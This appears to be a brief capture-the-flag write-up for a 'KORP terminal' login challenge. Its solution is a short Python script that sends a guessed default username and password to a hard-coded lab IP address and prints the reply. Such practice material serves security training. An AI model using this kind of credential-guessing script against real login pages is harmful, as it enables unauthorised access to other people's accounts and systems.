## **Description**
Your faction must infiltrate the KORP™ terminal and gain access to the Legionaries' privileged information and find out more about the organizers of the Fray. The terminal login screen is protected by state-of-the-art encryption and security protocols.

Solution: 

```py
from requests import *

url="http://83.136.253.3:40697/"

s=Session()
data={"username":"admin","password":"password123"}
r=post(url,data=data)
print(r.text)
```
